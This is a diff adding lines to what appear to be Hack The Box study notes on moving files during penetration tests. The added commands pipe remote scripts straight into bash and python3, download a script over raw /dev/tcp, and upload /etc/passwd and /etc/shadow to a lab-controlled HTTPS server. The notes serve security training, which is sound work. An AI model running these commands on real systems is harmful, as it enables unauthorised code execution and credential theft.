@@ -66,6 +66,30 @@ file shell
 
 #check the integrity of the file in both the machine.
 md5sum shell
+
+
+Web Downloads with Wget and cURL
+wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh
+somx@htb[/htb]$ curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
+
+
+Fileless Download with cURL and wget:
+somx@htb[/htb]$ curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
+somx@htb[/htb]$ wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3
+
+#Download with Bash (/dev/tcp)
+somx@htb[/htb]$ exec 3<>/dev/tcp/10.10.10.32/80
+somx@htb[/htb]$ echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
+somx@htb[/htb]$ cat <&3
+
+
+Pwnbox - Start Web Server
+somx@htb[/htb]$ sudo python3 -m pip install --user uploadserver
+somx@htb[/htb]$ openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
+somx@htb[/htb]$ mkdir https && cd https
+somx@htb[/htb]$ sudo python3 -m uploadserver 443 --server-certificate ~/server.pem
+somx@htb[/htb]$ curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
+
 ```
 
 
